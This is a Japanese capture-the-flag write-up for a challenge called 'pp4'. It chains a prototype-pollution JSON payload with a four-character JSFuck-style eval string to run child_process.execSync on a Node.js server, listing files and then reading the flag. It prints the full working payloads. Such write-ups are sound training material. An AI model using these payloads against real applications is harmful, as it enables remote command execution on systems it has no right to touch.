# pp4
入力したJSONをクローンする処理とその後、入力された文字列をevalする処理があるアプリケーション。

入力したJSONをクローンする処理の部分ではPrototype Pollutionが発生する。また、入力された文字列をevalする処理では、文字種が4種類のみの制限がある。

まず任意の文字列を実行できるコードとして次のようなものが存在する。
```javascript
[]["filter"]["constructor"]( "CODE" )()
```

このうち、`[]()`以外の文字列部分（ `"` で囲まれた部分）をPrototype Pollutionを利用して得ることを考える。

次のようなJSONをパースさせると、`[]`のみを利用して、上記の文字列部分を得られることを利用する。
```json
{
  "__proto__": {
    "": "a",
    "a": "b",
    "b": "c",
    "c": {
      "a": "filter",
      "b": "constructor",
      "c": "return global.process.mainModule.constructor._load(`child_process`).execSync(`ls /`).toString()"
    }
  }
}
```
つまり、 `"filter"` を得るには下記の手順となる。
1. `[][[]]` で `"a"`を得る。
2. `[][[][[]]]` ( `[]["a"]` ) で `"b"` を得る。
2. `[][[][[][[]]]]` ( `[]["b"]` ) で `"c"` を得る。
2. `[][[][[][[][[]]]]][[][[]]]` ( `[]["c"]["a"]` ) で `"filter"` を得る。

他の文字列部分も同様にすれば、下記の4種類の文字のみで `child_process.execSync()` を実行できる。

```js
[][[][[][[][[][[[]]]]]][[][[]]]][[][[][[][[][[]]]]][[][[][[]]]]]([][[][[][[][[]]]]][[][[][[][[]]]]])()
```

上記で `ls /` でフラグのファイル名を読み取り、 `cat /flag-1863aa693df962ff8433c6b227d63dc0.txt` としてフラグを読み取ることができた。